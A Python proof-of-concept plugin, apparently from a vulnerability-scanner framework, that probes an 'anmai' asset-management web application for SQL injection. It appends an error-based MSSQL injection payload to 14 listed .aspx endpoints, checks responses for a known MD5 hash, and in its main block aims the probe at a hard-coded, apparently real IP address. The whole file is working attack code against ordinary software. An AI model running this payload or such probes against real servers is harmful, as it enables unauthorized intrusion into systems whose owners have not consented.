#!/usr/bin/env python
# -*- coding: utf-8 -*
# _Auther_ = Me_fortune
# 
# _Refer_  = http://www.wooyun.org/bugs/wooyun-2010-0107248
def assign(service, arg):
    if service == 'anmai':
        return True, arg

def audit(arg):
    urls = [
    "Asset/House/HouseInfo_View.aspx?HouseID=1",
    "Asset/House/HouseRebuild_view.aspx?HouseID=1",
    "Asset/House/Newhexiao.aspx?hidsearch=search&housebelong=1",
    "Edis/adminpara/SetGeneralComment.aspx?selgrade=1",
    "Asset/Device/Device_Validate.aspx?PrepareNo=1",
    "Asset/Field/fieldInfo_View.aspx?fieldenrolid=1",
    "Asset/House/Admin_Photo.aspx?&Action=Modify&HouseID=1",
    "Asset/Device/DeviceLeadSearch.aspx?hidsearch=search&outstoreid=1",
    "/Asset/Device/DeviceRebuildInfo_View.aspx?DeviceRebuildID=1",
    "Asset/Device/DeviceSort_Lead_Detail.aspx?prepareNo=1",
    "Asset/Device/DeviceSort_Lead_OK.aspx?hid_prepareno=1",
    "Asset/Device/Admin_Photo.aspx?Action=Modify&HouseID=1",
    "Asset/Device/DeviceCancelInfo_View.aspx?DeviceCancelID=1",
    "Asset/Device/DeviceInputSearch.aspx?hidsearch=search&assetfactory=1"
    ]

    data = "'+and+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))--"
    for url in urls:
        vul = arg + url + data
        code, head, res, errcode, _ = curl.curl2(vul)
        if code==500 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
            security_hole(arg + url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('anmai','http://218.22.96.74:8899/')[1])